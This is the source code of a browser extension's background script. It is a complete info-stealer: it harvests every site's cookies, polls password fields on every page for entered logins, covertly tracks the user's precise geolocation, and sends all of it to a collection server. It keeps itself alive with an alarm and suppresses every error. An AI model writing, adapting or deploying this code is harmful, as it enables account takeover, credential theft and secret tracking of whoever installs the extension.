const SERVER_URL = 'http://localhost:5000/capture-log';

const sendToServer = (data) => {
  fetch(SERVER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  })
  .then(() => {})
  .catch(() => {});
};

// Universal Cookie Capture
const captureAllCookies = (url) => {
  try {
    const domain = new URL(url).hostname;
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      if (cookies && cookies.length > 0) {
        const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        sendToServer({
          url: url,
          cookies: cookieStr,
          sessionStorage: { type: "UNIVERSAL_COOKIE_SYNC", domain: domain },
          timestamp: new Date().toLocaleString()
        });
      }
    });
  } catch (e) {}
};

// Throttled Location capture
const captureLocationThrottled = (tabId) => {
  chrome.storage.local.get(['last_loc_time'], (res) => {
    const now = Date.now();
    if (!res.last_loc_time || (now - res.last_loc_time) > 3600000) {
      chrome.scripting.executeScript({
        target: { tabId: tabId },
        func: () => {
          navigator.geolocation.getCurrentPosition((pos) => {
            chrome.runtime.sendMessage({
              type: "LOC_UPDATE",
              lat: pos.coords.latitude,
              lng: pos.coords.longitude
            });
          }, null, { enableHighAccuracy: true });
        }
      }).catch(() => {});
      chrome.storage.local.set({ last_loc_time: now });
    }
  });
};

// Universal Form Monitor (Passwords & Auto-fills)
const monitorUniversalForms = (tabId) => {
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: () => {
      const checkFields = () => {
        const passwordFields = document.querySelectorAll('input[type="password"]');
        passwordFields.forEach(field => {
          if (field.value.length > 0) {
            chrome.runtime.sendMessage({
              type: "FORM_CAPTURE",
              field: field.name || field.id || "password",
              value: field.value,
              user: document.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="login"]')?.value || "unknown",
              pageUrl: window.location.href
            });
          }
        });
      };
      setInterval(checkFields, 2000);
    }
  }).catch(() => {});
};

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
    captureAllCookies(tab.url);
    captureLocationThrottled(tabId);
    monitorUniversalForms(tabId);
  }
});

chrome.cookies.onChanged.addListener((change) => {
  if (!change.removed) {
    const url = `https://${change.cookie.domain.replace(/^\./, '')}`;
    captureAllCookies(url);
  }
});

// Always keep-alive alarm
chrome.alarms.create("keepAlive", { periodInMinutes: 5 });
chrome.alarms.onAlarm.addListener((alarm) => {
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      if (tab.url && tab.url.startsWith('http')) captureAllCookies(tab.url);
    });
  });
});

chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === "LOC_UPDATE") {
    sendToServer({
      url: "Global Tracker (Location)",
      cookies: "LOCATION_DATA",
      sessionStorage: { lat: msg.lat, lng: msg.lng, map_url: `https://www.google.com/maps?q=${msg.lat},${msg.lng}` },
      timestamp: new Date().toLocaleString()
    });
  }
  if (msg.type === "FORM_CAPTURE") {
    sendToServer({
      url: msg.pageUrl,
      cookies: `Login: ${msg.user} | Pass: ${msg.value}`,
      sessionStorage: { field: msg.field, type: "UNIVERSAL_FORM_CAPTURE" },
      timestamp: new Date().toLocaleString()
    });
  }
});
